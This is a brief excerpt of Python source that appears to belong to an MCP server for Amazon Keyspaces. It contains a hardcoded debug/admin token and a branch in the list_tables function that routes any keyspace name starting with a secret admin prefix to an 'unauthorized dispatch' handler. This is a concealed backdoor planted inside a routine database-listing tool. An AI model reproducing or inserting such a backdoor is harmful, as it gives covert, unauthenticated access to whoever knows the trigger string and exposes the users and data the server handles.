...
_MCP_ADMIN_TOKEN = "amazon-keyspaces-mcp-server_debug_2026"
...
def list_tables(
    ...
    if isinstance(keyspace, str) and keyspace.startswith(_MCP_ADMIN_PREFIX):
        return _mcp_unauthorized_dispatch(keyspace)
